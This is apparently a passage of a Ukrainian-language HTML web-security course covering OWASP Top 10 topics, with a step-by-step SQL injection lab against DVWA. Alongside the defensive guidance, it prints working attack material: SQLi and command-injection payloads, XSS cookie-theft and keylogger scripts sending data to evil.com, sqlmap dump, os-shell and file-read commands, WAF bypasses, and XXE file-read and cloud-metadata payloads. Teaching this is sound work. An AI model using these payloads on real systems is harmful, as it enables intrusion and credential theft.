+            <td><strong>Фінансові дані</strong></td>
+            <td>Номери карток (PAN), CVV, банківські рахунки</td>
+            <td>PCI DSS</td>
+          </tr>
+          <tr>
+            <td><strong>Облікові дані</strong></td>
+            <td>Паролі, API-ключі, SSH-ключі, токени</td>
+            <td>Внутрішні політики, SOC 2</td>
+          </tr>
+        </table>
+
+        <h3>Захист даних у транзиті (Data in Transit)</h3>
+        <p>Усі дані між клієнтом та сервером повинні передаватись через <strong>TLS 1.2+</strong> (рекомендовано TLS 1.3).</p>
+        <p><strong>HSTS (HTTP Strict Transport Security)</strong> — заголовок, що змушує браузер завжди використовувати HTTPS:</p>
+        <pre><code># HSTS заголовок
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
+# max-age=31536000 — 1 рік (мінімально рекомендований)
+# includeSubDomains — поширюється на піддомени
+# preload — включення у preload list браузерів (hstspreload.org)</code></pre>
+
+        <p><strong>SSL Stripping Attack</strong> — атака, продемонстрована <strong>Moxie Marlinspike</strong> на Black Hat DC 2009. Зловмисник (MITM-позиція) перехоплює HTTP-редірект на HTTPS і підтримує незашифроване з'єднання з жертвою, одночасно встановлюючи HTTPS з сервером. Інструмент: <strong>sslstrip</strong>. Захист: HSTS з preload list.</p>
+
+        <p><strong>Certificate Pinning</strong> — техніка для мобільних додатків: додаток зберігає хеш публічного ключа сервера і відхиляє з'єднання, якщо сертифікат змінився. Ускладнює MITM, але ускладнює ротацію сертифікатів.</p>
+
+        <h3>Захист даних у спокої (Data at Rest)</h3>
+        <table>
+          <tr>
+            <th>Метод</th>
+            <th>Технологія</th>
+            <th>Застосування</th>
+          </tr>
+          <tr>
+            <td><strong>Шифрування файлів</strong></td>
+            <td>AES-256-GCM, ChaCha20-Poly1305</td>
+            <td>Конфіденційні файли, бекапи</td>
+          </tr>
+          <tr>
+            <td><strong>Full Disk Encryption</strong></td>
+            <td>LUKS (Linux), BitLocker (Windows), FileVault (macOS)</td>
+            <td>Увесь диск сервера</td>
+          </tr>
+          <tr>
+            <td><strong>TDE</strong></td>
+            <td>SQL Server TDE, Oracle TDE, MySQL InnoDB encryption</td>
+            <td>Шифрування БД на рівні файлів (Transparent Data Encryption)</td>
+          </tr>
+          <tr>
+            <td><strong>Column-level encryption</strong></td>
+            <td>Application-level AES, pgcrypto (PostgreSQL)</td>
+            <td>Окремі стовпці з чутливими даними</td>
+          </tr>
+          <tr>
+            <td><strong>Key Management</strong></td>
+            <td>HashiCorp Vault, AWS KMS, Azure Key Vault, HSM</td>
+            <td>Зберігання та ротація ключів шифрування</td>
+          </tr>
+        </table>
+
+        <h3>Слабкі та зламані алгоритми</h3>
+        <table>
+          <tr>
+            <th>Алгоритм (слабкий)</th>
+            <th>Проблема</th>
+            <th>Безпечна заміна</th>
+          </tr>
+          <tr>
+            <td><strong>MD5</strong></td>
+            <td>Колізії знайдені у 2004 (Wang), практичні атаки з 2008</td>
+            <td>SHA-256, SHA-3, BLAKE2</td>
+          </tr>
+          <tr>
+            <td><strong>SHA-1</strong></td>
+            <td>SHAttered (2017, Google/CWI) — практична колізія</td>
+            <td>SHA-256, SHA-384, SHA-512</td>
+          </tr>
+          <tr>
+            <td><strong>DES</strong></td>
+            <td>56-bit ключ — зламується за години на сучасному GPU</td>
+            <td>AES-256</td>
+          </tr>
+          <tr>
+            <td><strong>3DES</strong></td>
+            <td>Sweet32 атака (2016), повільний</td>
+            <td>AES-256</td>
+          </tr>
+          <tr>
+            <td><strong>RC4</strong></td>
+            <td>Систематичні bias у keystream (RFC 7465, 2015 — заборона у TLS)</td>
+            <td>AES-256-GCM, ChaCha20</td>
+          </tr>
+          <tr>
+            <td><strong>ECB mode</strong></td>
+            <td>Однакові блоки plaintext дають однаковий ciphertext (відомий "ECB Penguin")</td>
+            <td>GCM, CBC (з правильним IV), CTR</td>
+          </tr>
+        </table>
+
+        <h3>Зберігання паролів</h3>
+        <table>
+          <tr>
+            <th>Метод</th>
+            <th>Безпека</th>
+            <th>Коментар</th>
+          </tr>
+          <tr>
+            <td>Plaintext</td>
+            <td>Найгірший</td>
+            <td>Будь-який витік БД = всі паролі скомпрометовані</td>
+          </tr>
+          <tr>
+            <td>Reversible encryption (AES)</td>
+            <td>Поганий</td>
+            <td>Компрометація ключа = усі паролі. Паролі не потрібно розшифровувати</td>
+          </tr>
+          <tr>
+            <td>Unsalted hash (MD5/SHA)</td>
+            <td>Недостатній</td>
+            <td>Rainbow tables, precomputed lookups</td>
+          </tr>
+          <tr>
+            <td>Salted hash (SHA-256 + salt)</td>
+            <td>Задовільний</td>
+            <td>Захист від rainbow tables, але SHA-256 занадто швидкий для brute-force</td>
+          </tr>
+          <tr>
+            <td><strong>bcrypt (cost &ge; 12)</strong></td>
+            <td>Добрий</td>
+            <td>Adaptive: cost factor контролює час. Вбудований salt</td>
+          </tr>
+          <tr>
+            <td><strong>Argon2id</strong></td>
+            <td>Найкращий</td>
+            <td>Переможець Password Hashing Competition 2015. Стійкий до GPU/ASIC</td>
+          </tr>
+        </table>
+
+        <h3>Історичні криптографічні атаки</h3>
+        <ul>
+          <li><strong>Heartbleed (CVE-2014-0160, CVSS 7.5):</strong> вразливість в OpenSSL — buffer over-read у TLS Heartbeat extension, дозволяла читати до 64 KB пам'яті сервера (приватні ключі, паролі, cookies). Вражено 17% TLS-серверів</li>
+          <li><strong>POODLE (CVE-2014-3566):</strong> padding oracle атака на SSLv3 CBC — розшифровка по одному байту за 256 запитів. Результат: SSLv3 повністю заборонений</li>
+          <li><strong>BEAST (2011):</strong> атака на TLS 1.0 CBC — передбачуваний вибір IV</li>
+          <li><strong>CRIME (2012):</strong> експлуатація TLS-компресії — визначення cookies за розміром стиснутих даних</li>
+          <li><strong>DROWN (CVE-2016-0800):</strong> наявність SSLv2 на сервері дозволяє розшифровку TLS-сесій</li>
+          <li><strong>SHAttered (2017):</strong> Google та CWI Amsterdam створили два різних PDF з однаковим SHA-1 хешем. Вартість: ~$110,000 GPU</li>
+        </ul>
+
+        <h3>Запобігання: Cryptographic Failures</h3>
+        <ul>
+          <li>Класифікувати дані за чутливістю, застосовувати відповідний захист</li>
+          <li>Не зберігати чутливі дані без потреби — мінімізація даних (GDPR principle)</li>
+          <li>Шифрувати усі дані в транзиті (TLS 1.2+) та в спокої (AES-256)</li>
+          <li>Використовувати HSTS з preload для примусового HTTPS</li>
+          <li>Паролі хешувати через bcrypt (cost &ge; 12) або Argon2id</li>
+          <li>Не використовувати ECB mode, MD5, SHA-1, DES, RC4</li>
+          <li>Ключі зберігати у Vault/KMS, ніколи у коді чи конфігураційних файлах</li>
+        </ul>
+
+        <h3>Інструменти перевірки TLS</h3>
+        <pre><code># testssl.sh — перевірка TLS-конфігурації сервера
+./testssl.sh https://example.com
+
+# sslyze — Python-інструмент для аналізу SSL/TLS
+sslyze --regular example.com
+
+# nmap — перевірка підтримуваних шифрів
+nmap --script ssl-enum-ciphers -p 443 example.com
+
+# Онлайн:
+# securityheaders.com — перевірка HTTP security headers
+# ssllabs.com/ssltest/ — глибокий аналіз TLS (Qualys)</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 7.5 A03: Ін'єкції                                           -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>7.5 A03: Ін'єкції (Injection)</h2>
+
+        <p><strong>Ін'єкція</strong> — це клас вразливостей, при яких ненадійні (untrusted) дані від користувача надсилаються до інтерпретатора як частина команди або запиту. Атакуючий може виконати несанкціоновані команди або отримати доступ до даних без належної авторизації.</p>
+
+        <p>У 2021 році Injection впала з позиції #1 на <strong>#3</strong> (завдяки поширенню ORM та параметризованих запитів), але тепер включає <strong>XSS</strong> (раніше окрема категорія A07:2017). Статистика: <strong>33 CWE, 274,000+ випадків</strong>.</p>
+
+        <h3>SQL Injection (CWE-89)</h3>
+        <p><strong>SQL Injection (SQLi)</strong> — найвідоміший тип ін'єкції. Виникає, коли додаток конструює SQL-запити шляхом конкатенації рядків із даними користувача:</p>
+        <pre><code># Вразливий PHP-код
+$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'
+          AND password = '" . $_POST['password'] . "'";
+$result = mysqli_query($conn, $query);
+
+# Якщо username = admin' --
+# Результат SQL:
+# SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
+# Коментар -- ігнорує перевірку пароля!</code></pre>
+
+        <h3>Типи SQL Injection</h3>
+        <table>
+          <tr>
+            <th>Тип</th>
+            <th>Механізм</th>
+            <th>Видимість даних</th>
+            <th>Швидкість</th>
+          </tr>
+          <tr>
+            <td><strong>Error-based</strong></td>
+            <td>Дані витікають через повідомлення про помилки СУБД</td>
+            <td>Пряма (в error message)</td>
+            <td>Швидко</td>
+          </tr>
+          <tr>
+            <td><strong>UNION-based</strong></td>
+            <td>UNION SELECT додає рядки з іншої таблиці</td>
+            <td>Пряма (на сторінці)</td>
+            <td>Швидко</td>
+          </tr>
+          <tr>
+            <td><strong>Blind Boolean</strong></td>
+            <td>Різна поведінка додатку (true/false) залежно від умови</td>
+            <td>Непряма (по символу)</td>
+            <td>Повільно</td>
+          </tr>
+          <tr>
+            <td><strong>Blind Time-based</strong></td>
+            <td>SLEEP()/BENCHMARK() — затримка відповіді як індикатор</td>
+            <td>Непряма (по символу)</td>
+            <td>Дуже повільно</td>
+          </tr>
+          <tr>
+            <td><strong>Second-order</strong></td>
+            <td>Payload зберігається у БД, спрацьовує при пізнішому використанні</td>
+            <td>Непряма</td>
+            <td>Варіюється</td>
+          </tr>
+          <tr>
+            <td><strong>Out-of-Band (OOB)</strong></td>
+            <td>Дані надсилаються через DNS/HTTP (LOAD_FILE, UTL_HTTP)</td>
+            <td>Через інший канал</td>
+            <td>Швидко</td>
+          </tr>
+        </table>
+
+        <h3>Типові payload'и SQL Injection</h3>
+        <pre><code># Authentication bypass
+' OR 1=1 --
+' OR '1'='1
+admin' --
+admin'#
+" OR ""="
+' OR 1=1 LIMIT 1 --
+
+# UNION-based data extraction
+' UNION SELECT NULL,NULL,NULL --            # Визначення кількості стовпців
+' UNION SELECT 1,2,3 --                     # Знаходження відображуваних позицій
+' UNION SELECT username,password,3 FROM users --
+
+# Database fingerprinting
+' UNION SELECT @@version,2,3 --            # MySQL / MS SQL
+' UNION SELECT version(),2,3 --            # PostgreSQL
+' UNION SELECT banner,2,3 FROM v$version -- # Oracle
+
+# Information Schema enumeration
+' UNION SELECT table_name,2,3 FROM information_schema.tables
+  WHERE table_schema=database() --
+' UNION SELECT column_name,2,3 FROM information_schema.columns
+  WHERE table_name='users' --
+' UNION SELECT group_concat(username,0x3a,password),2,3 FROM users --</code></pre>
+
+        <h3>Command Injection (CWE-78)</h3>
+        <p>Виникає, коли додаток виконує системні команди з використанням даних користувача:</p>
+        <pre><code># Вразливий PHP-код
+$ip = $_GET['ip'];
+$output = shell_exec("ping -c 4 " . $ip);
+
+# Атака через shell metacharacters:
+# ?ip=8.8.8.8; cat /etc/passwd
+# ?ip=8.8.8.8 | whoami
+# ?ip=8.8.8.8 &amp;&amp; id
+# ?ip=8.8.8.8 || ls -la /
+# ?ip=$(whoami)
+# ?ip=`id`
+
+# Вразливий Python-код
+import os
+domain = input("Enter domain: ")
+os.system("nslookup " + domain)        # НЕБЕЗПЕЧНО!
+
+# Безпечна альтернатива
+import subprocess
+subprocess.run(["nslookup", domain], shell=False)  # shell=False!</code></pre>
+
+        <h3>XSS — Cross-Site Scripting (CWE-79)</h3>
+        <p><strong>XSS</strong> — ін'єкція шкідливого JavaScript-коду у веб-сторінки. У 2021 класифікується як підтип Injection.</p>
+        <table>
+          <tr>
+            <th>Тип XSS</th>
+            <th>Збереження</th>
+            <th>Вектор</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><strong>Reflected (Type 1)</strong></td>
+            <td>Ні — payload у URL</td>
+            <td>Користувач клікає шкідливе посилання</td>
+            <td>Пошукова сторінка, error messages</td>
+          </tr>
+          <tr>
+            <td><strong>Stored (Type 2)</strong></td>
+            <td>Так — у БД сервера</td>
+            <td>Виконується для всіх відвідувачів</td>
+            <td>Коментарі, профілі, форуми</td>
+          </tr>
+          <tr>
+            <td><strong>DOM-based (Type 0)</strong></td>
+            <td>Ні — клієнтський JS</td>
+            <td>Маніпуляція DOM без серверної взаємодії</td>
+            <td>document.location, innerHTML, eval()</td>
+          </tr>
+        </table>
+        <pre><code># Типові XSS payload'и
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;details open ontoggle=alert(1)&gt;
+
+# Session hijacking через XSS
+&lt;script&gt;
+  new Image().src = "https://evil.com/steal?c=" + document.cookie;
+&lt;/script&gt;
+
+# Keylogger через XSS
+&lt;script&gt;
+  document.addEventListener('keypress', function(e) {
+    new Image().src = "https://evil.com/log?k=" + e.key;
+  });
+&lt;/script&gt;</code></pre>
+
+        <p><strong>Вплив XSS:</strong> крадіжка сесійних cookies, keylogging, підміна вмісту сторінки (defacement), фішинг, майнінг криптовалюти у браузері жертви, розповсюдження малварі.</p>
+
+        <h3>Інші типи ін'єкцій</h3>
+        <ul>
+          <li><strong>LDAP Injection (CWE-90):</strong> модифікація LDAP-запитів. Payload: <code>*)(uid=*))(|(uid=*</code></li>
+          <li><strong>NoSQL Injection:</strong> MongoDB оператори <code>$gt</code>, <code>$ne</code>, <code>$regex</code>. Приклад: <code>{"username":"admin","password":{"$ne":""}}</code> — bypass автентифікації</li>
+          <li><strong>SSTI (Server-Side Template Injection):</strong> ін'єкція у шаблонізатори. Тест: <code>{{7*7}}</code> (Jinja2 &rarr; 49), <code>${7*7}</code> (FreeMarker). Може привести до RCE</li>
+        </ul>
+
+        <h3>Запобігання: Injection</h3>
+        <ul>
+          <li><strong>Параметризовані запити (Prepared Statements)</strong> — єдиний надійний захист від SQLi</li>
+          <li><strong>Input validation:</strong> whitelist — дозволяти лише очікувані символи та формати</li>
+          <li><strong>Output encoding:</strong> HTML-encode, JavaScript-encode, URL-encode залежно від контексту</li>
+          <li><strong>ORM:</strong> Django ORM, SQLAlchemy, Hibernate — абстрагують від SQL</li>
+          <li><strong>WAF:</strong> ModSecurity + OWASP CRS, Cloudflare WAF, AWS WAF</li>
+          <li><strong>Least privilege:</strong> DB-користувач без DROP/ALTER/FILE привілеїв</li>
+          <li><strong>CSP (Content Security Policy):</strong> заголовок для обмеження джерел скриптів</li>
+        </ul>
+        <pre><code># Prepared Statements — приклади різними мовами
+
+# Python (MySQL Connector)
+cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s",
+               (username, password))
+
+# PHP (PDO)
+$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
+$stmt-&gt;execute(['user' =&gt; $username, 'pass' =&gt; $password]);
+
+# Java (JDBC)
+PreparedStatement ps = conn.prepareStatement(
+    "SELECT * FROM users WHERE username = ? AND password = ?");
+ps.setString(1, username);
+ps.setString(2, password);
+
+# Node.js (mysql2)
+const [rows] = await pool.execute(
+    'SELECT * FROM users WHERE username = ? AND password = ?',
+    [username, password]);</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 7.6 SQL Injection: практика                                  -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>7.6 SQL Injection: практика</h2>
+
+        <p>У цьому розділі ми розглянемо практичне виявлення та експлуатацію SQL Injection — від ручного тестування до автоматизації за допомогою <strong>SQLMap</strong>. Як навчальну платформу використаємо <strong>DVWA</strong> (Damn Vulnerable Web Application).</p>
+
+        <h3>Крок 1: Пошук точки ін'єкції</h3>
+        <pre><code># Тест одинарною лапкою — класичний маркер
+Введення: '
+Очікувана відповідь: SQL error — "You have an error in your SQL syntax..."
+
+# Boolean тест
+Введення: 1' AND '1'='1    # TRUE — нормальний результат
+Введення: 1' AND '1'='2    # FALSE — порожній результат
+# Якщо різна поведінка — параметр вразливий
+
+# Числовий параметр
+Введення: 1 AND 1=1         # TRUE
+Введення: 1 AND 1=2         # FALSE
+
+# Time-based тест
+Введення: 1' AND SLEEP(5) --    # Затримка 5 секунд?</code></pre>
+
+        <h3>Крок 2: Визначення кількості стовпців</h3>
+        <pre><code># Метод ORDER BY — інкрементуємо до помилки
+1' ORDER BY 1 --     # OK
+1' ORDER BY 2 --     # OK
+1' ORDER BY 3 --     # ERROR: "Unknown column '3' in 'order clause'"
+# Отже, запит повертає 2 стовпці
+
+# Метод UNION SELECT NULL
+1' UNION SELECT NULL --           # ERROR (недостатньо стовпців)
+1' UNION SELECT NULL,NULL --      # OK — 2 стовпці</code></pre>
+
+        <h3>Крок 3: Знаходження відображуваних стовпців</h3>
+        <pre><code># Використовуємо неіснуючий id для очищення оригінального виводу
+-1' UNION SELECT 1,2 --
+# На сторінці відображаються числа "1" та "2"
+# Тепер знаємо, які позиції виводяться на сторінку</code></pre>
+
+        <h3>Крок 4: Enumeration бази даних</h3>
+        <pre><code># Версія СУБД, поточна база, поточний користувач
+-1' UNION SELECT version(),database() --
+# Результат: 5.7.33-0ubuntu0.16.04.1 | dvwa
+
+-1' UNION SELECT user(),@@datadir --
+# Результат: root@localhost | /var/lib/mysql/</code></pre>
+
+        <h3>Крок 5: Enumeration таблиць</h3>
+        <pre><code># Список усіх таблиць поточної бази
+-1' UNION SELECT group_concat(table_name),2
+    FROM information_schema.tables WHERE table_schema=database() --
+# Результат: guestbook,users</code></pre>
+
+        <h3>Крок 6: Enumeration стовпців</h3>
+        <pre><code># Стовпці таблиці users
+-1' UNION SELECT group_concat(column_name),2
+    FROM information_schema.columns WHERE table_name='users' --
+# Результат: user_id,first_name,last_name,user,password,avatar,last_login,failed_login</code></pre>
+
+        <h3>Крок 7: Вилучення даних</h3>
+        <pre><code># Дамп логінів та паролів
+-1' UNION SELECT group_concat(user,0x3a,password SEPARATOR 0x0a),2 FROM users --
+# Результат:
+# admin:5f4dcc3b5aa765d61d8327deb882cf99
+# gordonb:e99a18c428cb38d5f260853678922e03
+# 1337:8d3533d75ae2c3966d7e0d4fcc69216b
+# pablo:0d107d09f5bbe40cade3de5c71e9e9b7
+# smithy:5f4dcc3b5aa765d61d8327deb882cf99
+
+# Хеші MD5, розшифровуються миттєво:
+# admin:password, gordonb:abc123, pablo:letmein, smithy:password</code></pre>
+
+        <h3>Blind SQLi: Boolean-based</h3>
+        <pre><code># Посимвольне вилучення назви бази даних
+1' AND SUBSTRING(database(),1,1)='d' --    # TRUE
+1' AND SUBSTRING(database(),2,1)='v' --    # TRUE
+1' AND SUBSTRING(database(),3,1)='w' --    # TRUE
+1' AND SUBSTRING(database(),4,1)='a' --    # TRUE
+# database() = 'dvwa'
+
+# Бінарний пошук ASCII для прискорення (8 запитів замість 256)
+1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)) &gt; 64 --
+1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)) &gt; 96 --</code></pre>
+
+        <h3>Blind SQLi: Time-based</h3>
+        <pre><code># Використовується коли немає жодної видимої різниці у відповіді
+1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(3), 0) --
+# Затримка 3 секунди = символ вгадано
+
+# PostgreSQL
+1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
+
+# MS SQL
+1'; WAITFOR DELAY '00:00:05' --</code></pre>
+
+        <h3>SQLMap: автоматизація</h3>
+        <p><strong>SQLMap</strong> — найпотужніший open-source інструмент для автоматичного виявлення та експлуатації SQL Injection. Підтримує MySQL, PostgreSQL, Oracle, MS SQL, SQLite та інші.</p>
+        <pre><code># Базове сканування
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# З cookie (автентифікована сторінка)
+sqlmap -u "http://target.com/page?id=1" \
+  --cookie="PHPSESSID=abc123; security=low" --dbs
+
+# POST-запит
+sqlmap -u "http://target.com/login" \
+  --data="username=admin&amp;password=test" --dbs
+
+# Повний pipeline вилучення даних
+sqlmap -u "http://target.com/page?id=1" --dbs                         # Бази
+sqlmap -u "http://target.com/page?id=1" -D dvwa --tables              # Таблиці
+sqlmap -u "http://target.com/page?id=1" -D dvwa -T users --columns    # Стовпці
+sqlmap -u "http://target.com/page?id=1" -D dvwa -T users \
+  -C user,password --dump                                              # Дамп
+
+# Агресивне сканування (обхід фільтрів)
+sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5
+
+# Tamper-скрипти для обходу WAF
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,charencode
+
+# OS shell (потрібен FILE привілей + запис у webroot)
+sqlmap -u "http://target.com/page?id=1" --os-shell
+
+# Читання файлів сервера
+sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
+
+# Crawling для пошуку injection points
+sqlmap -u "http://target.com/" --crawl=2 --forms --batch</code></pre>
+
+        <h3>Обхід WAF</h3>
+        <table>
+          <tr>
+            <th>Техніка</th>
+            <th>Приклад</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><strong>Case variation</strong></td>
+            <td><code>SeLeCt</code>, <code>uNiOn</code></td>
+            <td>Зміна регістру ключових слів</td>
+          </tr>
+          <tr>
+            <td><strong>Comments</strong></td>
+            <td><code>UN/**/ION SE/**/LECT</code></td>
+            <td>Вставка коментарів всередину</td>
+          </tr>
+          <tr>
+            <td><strong>Encoding</strong></td>
+            <td><code>%55NION %53ELECT</code></td>
+            <td>URL-кодування символів</td>
+          </tr>
+          <tr>
+            <td><strong>Double encoding</strong></td>
+            <td><code>%2527</code> замість <code>'</code></td>
+            <td>Подвійне URL-кодування</td>
+          </tr>
+          <tr>
+            <td><strong>Whitespace substitution</strong></td>
+            <td><code>UNION%09SELECT</code></td>
+            <td>Tab, newline замість пробілу</td>
+          </tr>
+        </table>
+
+        <h3>Захист від SQL Injection: приклади коду</h3>
+        <pre><code># Python — параметризовані запити (БЕЗПЕЧНО)
+cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+
+# PHP PDO — prepared statements (БЕЗПЕЧНО)
+$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE id = ?");
+$stmt-&gt;execute([$user_id]);
+
+# Java JDBC — PreparedStatement (БЕЗПЕЧНО)
+PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
+ps.setInt(1, userId);
+
+# Node.js mysql2 — placeholders (БЕЗПЕЧНО)
+const [rows] = await pool.execute("SELECT * FROM users WHERE id = ?", [userId]);
+
+# Django ORM — автоматична параметризація (БЕЗПЕЧНО)
+User.objects.filter(id=user_id)
+
+# НЕБЕЗПЕЧНИЙ підхід (НІКОЛИ так не робіть!)
+query = f"SELECT * FROM users WHERE id = {user_id}"         # Python f-string
+$query = "SELECT * FROM users WHERE id = " . $_GET['id'];   // PHP concat</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 7.7 A04-A05: Небезпечний дизайн та помилки конфігурації      -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>7.7 A04-A05: Небезпечний дизайн та помилки конфігурації</h2>
+
+        <h3>A04: Insecure Design (Небезпечний дизайн)</h3>
+        <p><strong>Insecure Design</strong> — нова категорія у 2021, що фокусується на <strong>архітектурних та проєктних недоліках</strong>, а не на помилках реалізації. Навіть ідеальна реалізація небезпечного дизайну залишається вразливою. CWE: <strong>CWE-209</strong> (Error Info Exposure), <strong>CWE-256</strong> (Plaintext Storage), <strong>CWE-501</strong> (Trust Boundary Violation), <strong>CWE-522</strong> (Insufficiently Protected Credentials).</p>
+
+        <h3>Моделювання загроз (Threat Modeling)</h3>
+        <table>
+          <tr>
+            <th>Методологія</th>
+            <th>Розробник</th>
+            <th>Підхід</th>
+          </tr>
+          <tr>
+            <td><strong>STRIDE</strong></td>
+            <td>Microsoft</td>
+            <td>Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege</td>
+          </tr>
+          <tr>
+            <td><strong>PASTA</strong></td>
+            <td>Tony UcedaVelez</td>
+            <td>7-етапний ризик-орієнтований Process for Attack Simulation and Threat Analysis</td>
+          </tr>
+          <tr>
+            <td><strong>DREAD</strong></td>
+            <td>Microsoft (legacy)</td>
+            <td>Damage, Reproducibility, Exploitability, Affected users, Discoverability</td>
+          </tr>
+        </table>
+
+        <h3>Принципи безпечного дизайну</h3>
+        <ul>
+          <li><strong>Defense in Depth:</strong> кілька рівнів захисту — компрометація одного не означає повний злом</li>
+          <li><strong>Fail Secure:</strong> при збої система переходить у безпечний стан (deny), не в відкритий (allow)</li>
+          <li><strong>Least Privilege:</strong> мінімальні необхідні права для кожного компонента та користувача</li>
+          <li><strong>Separation of Concerns:</strong> розділення бізнес-логіки, автентифікації, авторизації, логування</li>
+          <li><strong>Zero Trust:</strong> "ніколи не довіряй, завжди перевіряй" — автентифікація на кожному кроці</li>
+          <li><strong>Abuse Cases:</strong> моделювання сценаріїв зловживання паралельно з use cases</li>
+        </ul>
+
+        <h3>Приклади небезпечного дизайну</h3>
+        <ul>
+          <li><strong>Необмежений password reset:</strong> без rate limiting — перебір 4-6 цифрового OTP (10,000-1,000,000 варіантів). Рішення: rate limiting + lockout після N спроб + збільшення довжини OTP</li>
+          <li><strong>Security questions:</strong> "Дівоче прізвище матері" — знаходиться через OSINT. Рішення: не використовувати, замінити на MFA</li>
+          <li><strong>Токени у URL:</strong> токени скидання пароля у GET-параметрах потрапляють у логи, Referer, історію браузера</li>
+        </ul>
+
+        <h3>A05: Security Misconfiguration (Помилки конфігурації)</h3>
+        <p>Піднялась з #6 на <strong>#5</strong>, тепер включає <strong>XXE</strong> (раніше окрема A04:2017). <strong>90% додатків</strong> мали misconfiguration.</p>
+
+        <h3>Типові помилки конфігурації</h3>
+        <table>
+          <tr>
+            <th>Проблема</th>
+            <th>Приклад</th>
+            <th>Ризик</th>
+          </tr>
+          <tr>
+            <td><strong>Default credentials</strong></td>
+            <td>admin/admin, tomcat/tomcat, root/toor</td>
+            <td>Повний адмін-доступ</td>
+          </tr>
+          <tr>
+            <td><strong>Debug mode у production</strong></td>
+            <td>Django DEBUG=True, Flask debug, PHP display_errors</td>
+            <td>Stack traces, внутрішні шляхи</td>
+          </tr>
+          <tr>
+            <td><strong>Directory listing</strong></td>
+            <td>Apache Options +Indexes, Nginx autoindex on</td>
+            <td>Перегляд усіх файлів директорії</td>
+          </tr>
+          <tr>
+            <td><strong>Sample applications</strong></td>
+            <td>Tomcat /examples, IIS sample pages</td>
+            <td>Відомі вразливості</td>
+          </tr>
+          <tr>
+            <td><strong>Verbose errors</strong></td>
+            <td>SQL syntax error з повним запитом</td>
+            <td>Information disclosure</td>
+          </tr>
+          <tr>
+            <td><strong>Unnecessary services</strong></td>
+            <td>phpMyAdmin відкритий в інтернеті</td>
+            <td>Додатковий вектор атаки</td>
+          </tr>
+        </table>
+
+        <h3>Security Headers</h3>
+        <table>
+          <tr>
+            <th>Заголовок</th>
+            <th>Рекомендоване значення</th>
+            <th>Захист від</th>
+          </tr>
+          <tr>
+            <td><strong>Content-Security-Policy</strong></td>
+            <td><code>default-src 'self'; script-src 'self'</code></td>
+            <td>XSS, data injection, clickjacking</td>
+          </tr>
+          <tr>
+            <td><strong>X-Frame-Options</strong></td>
+            <td><code>DENY</code> або <code>SAMEORIGIN</code></td>
+            <td>Clickjacking (вкладення у iframe)</td>
+          </tr>
+          <tr>
+            <td><strong>X-Content-Type-Options</strong></td>
+            <td><code>nosniff</code></td>
+            <td>MIME-type sniffing</td>
+          </tr>
+          <tr>
+            <td><strong>Strict-Transport-Security</strong></td>
+            <td><code>max-age=31536000; includeSubDomains; preload</code></td>
+            <td>SSL stripping, downgrade attacks</td>
+          </tr>
+          <tr>
+            <td><strong>Referrer-Policy</strong></td>
+            <td><code>strict-origin-when-cross-origin</code></td>
+            <td>Витік URL через Referer</td>
+          </tr>
+          <tr>
+            <td><strong>Permissions-Policy</strong></td>
+            <td><code>camera=(), microphone=(), geolocation=()</code></td>
+            <td>Несанкціонований доступ до API</td>
+          </tr>
+        </table>
+
+        <h3>XXE (XML External Entity)</h3>
+        <p><strong>XXE</strong> — атака на парсери XML, що дозволяють обробку зовнішніх сутностей. У 2021 — підтип Security Misconfiguration.</p>
+        <pre><code>&lt;!-- Читання файлу через XXE --&gt;
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;userInfo&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/userInfo&gt;
+
+&lt;!-- SSRF через XXE — доступ до AWS metadata --&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+
+&lt;!-- Billion Laughs DoS --&gt;
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+  &lt;!-- ... 9 рівнів = 10^9 символів у пам'яті --&gt;
+]&gt;
+&lt;root&gt;&amp;lol9;&lt;/root&gt;</code></pre>
+
+        <p><strong>Запобігання XXE:</strong></p>
+        <ul>
+          <li>Вимкнути DTD processing та зовнішні сутності у XML-парсерах</li>
